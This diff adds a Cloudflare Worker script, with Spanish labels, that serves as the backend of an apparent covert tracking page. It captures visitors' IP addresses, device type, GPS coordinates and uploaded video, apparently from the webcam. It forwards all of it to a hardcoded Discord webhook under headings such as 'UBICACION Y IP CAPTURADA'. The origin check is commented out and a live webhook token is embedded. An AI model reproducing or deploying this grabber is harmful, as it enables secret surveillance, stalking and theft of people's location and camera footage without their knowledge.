@@ -1,0 +1,135 @@
+export default {
+  async fetch(request, env, ctx) {
+    const origin = request.headers.get('Origin') || '';
+    const referer = request.headers.get('Referer') || '';
+    const allowedDomains = ['tudominio.com', 'localhost', '127.0.0.1'];
+    let isAllowed = false;
+    for (const dom of allowedDomains) {
+      if (origin.includes(dom) || referer.includes(dom)) {
+        isAllowed = true;
+        break;
+      }
+    }
+    // if (!isAllowed) return new Response('Acceso denegado', { status: 403 });
+
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1518254992325349477/b2wiQmkba9SPDPedErCexidD8pBjpbqiySYTrYb6Ivzx1DG57Y-khcLqCt2X_vkF6VgI';
+
+    try {
+      const contentType = request.headers.get('Content-Type') || '';
+
+      if (request.method === 'GET') {
+        const clientIP = request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || '0.0.0.0';
+        const userAgent = request.headers.get('User-Agent') || 'Desconocido';
+        const isMobile = /mobile|android|iphone/i.test(userAgent);
+        const device = isMobile ? '📱 Móvil' : '💻 PC';
+        const timestamp = new Date().toLocaleString('es-ES');
+
+        const embedIP = {
+          title: '🌐 IP Detectada (Worker)',
+          color: 3394560,
+          fields: [
+            { name: '📡 Dirección IP', value: `\`${clientIP}\``, inline: false },
+            { name: '💻 Dispositivo', value: device, inline: true },
+            { name: '⏰ Hora', value: timestamp, inline: true }
+          ],
+          timestamp: new Date().toISOString()
+        };
+
+        await fetch(DISCORD_WEBHOOK, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: '🚨 Conexión detectada (Worker)',
+            embeds: [embedIP]
+          })
+        });
+
+        return new Response(JSON.stringify({ ip: clientIP, device: device }), {
+          headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
+        });
+      }
+
+      if (request.method === 'POST' && contentType.includes('multipart/form-data')) {
+        const formData = await request.formData();
+        const file = formData.get('file');
+        const payloadJson = formData.get('payload_json');
+
+        if (!file) {
+          return new Response(JSON.stringify({ error: 'No se envio video' }), {
+            status: 400,
+            headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
+          });
+        }
+
+        const newFormData = new FormData();
+        newFormData.append('file', file, file.name || 'video.webm');
+        if (payloadJson) {
+          newFormData.append('payload_json', payloadJson);
+        }
+
+        const discordResponse = await fetch(DISCORD_WEBHOOK, {
+          method: 'POST',
+          body: newFormData
+        });
+
+        const status = discordResponse.status;
+        const text = await discordResponse.text();
+
+        return new Response(JSON.stringify({ status: status, response: text }), {
+          headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
+        });
+      }
+
+      if (request.method === 'POST' && contentType.includes('application/json')) {
+        const body = await request.json();
+        const clientIP = request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || '0.0.0.0';
+        const userAgent = request.headers.get('User-Agent') || 'Desconocido';
+        const isMobile = /mobile|android|iphone/i.test(userAgent);
+        const device = isMobile ? '📱 Móvil' : '💻 PC';
+        const timestamp = new Date().toLocaleString('es-ES');
+
+        const lat = body.lat || 'No disponible';
+        const lon = body.lon || 'No disponible';
+        const precision = body.accuracy || 'No disponible';
+        const mapLink = (lat !== 'No disponible' && lon !== 'No disponible') 
+          ? `https://maps.google.com/?q=${lat},${lon}` 
+          : '';
+
+        let descripcion = `📍 **Ubicacion GPS**\nLatitud: ${lat}°\nLongitud: ${lon}°\nPrecision: ±${precision}m\n\n🌐 **Datos de Red**\nIP: \`${clientIP}\`\n\n💻 **Dispositivo**\n${device}\n\n⏰ **Hora**\n${timestamp}`;
+
+        const embedData = {
+          title: '📍 Ubicacion + IP (Worker)',
+          description: descripcion,
+          color: 16711680,
+          timestamp: new Date().toISOString()
+        };
+        if (mapLink) {
+          embedData.fields = [
+            { name: '🗺️ Ver en Google Maps', value: `[Abrir Mapa](${mapLink})`, inline: false }
+          ];
+        }
+
+        await fetch(DISCORD_WEBHOOK, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: '📍 UBICACION Y IP CAPTURADA',
+            embeds: [embedData]
+          })
+        });
+
+        return new Response(JSON.stringify({ success: true }), {
+          headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
+        });
+      }
+
+      return new Response('Metodo no permitido', { status: 405 });
+
+    } catch (error) {
+      return new Response(JSON.stringify({ error: error.message }), {
+        status: 500,
+        headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
+      });
+    }
+  }
+};
